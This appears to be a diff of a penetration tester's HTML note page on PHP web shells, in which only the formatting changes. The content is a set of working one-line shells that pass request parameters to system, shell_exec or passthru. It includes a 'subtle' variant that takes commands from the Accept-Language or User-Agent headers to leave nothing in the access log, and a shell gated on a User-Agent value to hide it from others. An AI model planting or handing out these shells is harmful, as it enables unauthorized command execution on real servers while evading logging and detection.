@@ -13,17 +13,17 @@ website.com/vulnpage?cmd=&lt;exec command&gt;<br/>
 &#09;?&gt; <br/>
 <br/>
 same as: &lt;?php system($_GET['cmd']); ?&gt;<br/>
-Alternate: <span style="font-size: 10pt"><span style="font-family: inherit">&lt;?php</span>&nbsp;<span style="font-family: inherit">echo</span>&nbsp;<span style="font-family: inherit">shell_exec($_GET['cmd'].' 2&gt;&amp;1');</span>&nbsp;<span style="font-family: inherit">?&gt;</span></span>&nbsp; <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;?php passthru($_GET['cmd']); ?&gt; &nbsp;</li>
+Alternate: <span style="font-family: inherit"><span style="font-size: 10pt">&lt;?php</span></span><span style="font-size: 10pt">&nbsp;<span style="font-family: inherit">echo</span>&nbsp;<span style="font-family: inherit">shell_exec($_GET['cmd'].' 2&gt;&amp;1');</span>&nbsp;<span style="font-family: inherit">?&gt;</span></span>&nbsp; <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">&lt;?php passthru($_GET['cmd']); ?&gt; &nbsp;</li>
 </ul>
 </li>
 </ul>
 <br/>
 See <a href="nbk:///b3869c62-805d-4d59-8425-8f1253d774f4">PHP &gt; Code Exec Functions</a>&nbsp;for other potential commands to use.<br/>
 <br/>
-<span style="font-family: inherit"><span style="font-size: 10pt">preferred if you want to be noisy: &lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;<br/>
-</span></span><span style="font-family: inherit"><span style="font-size: 10pt">Something more subtle would be:</span></span><br/>
-&nbsp;&#09;&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;<span style="font-family: inherit"><span style="font-size: 10pt">&nbsp;&#09;&lt;- nothing in access log! Edit Accept-Language header in web proxy</span></span><br/>
-<span style="font-size: 10pt"><span style="font-family: inherit">&nbsp;&#09;or &lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;</span></span><br/>
+<span style="font-size: 10pt"><span style="font-family: inherit">preferred if you want to be noisy: &lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;<br/>
+</span></span><span style="font-size: 10pt"><span style="font-family: inherit">Something more subtle would be:</span></span><br/>
+&nbsp;&#09;&lt;?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?&gt;<span style="font-size: 10pt"><span style="font-family: inherit">&nbsp;&#09;&lt;- nothing in access log! Edit Accept-Language header in web proxy</span></span><br/>
+<span style="font-family: inherit"><span style="font-size: 10pt">&nbsp;&#09;or &lt;?php system($_SERVER['HTTP_USER_AGENT'])?&gt;</span></span><br/>
 <br/>
 Hide your shell from easily being used by other people:<br/>
 &lt;?php if($_SERVER['HTTP_USER_AGENT']=="evil1"){echo passthru($_GET['cmd']);} else{echo " "; ?&gt; <br/>
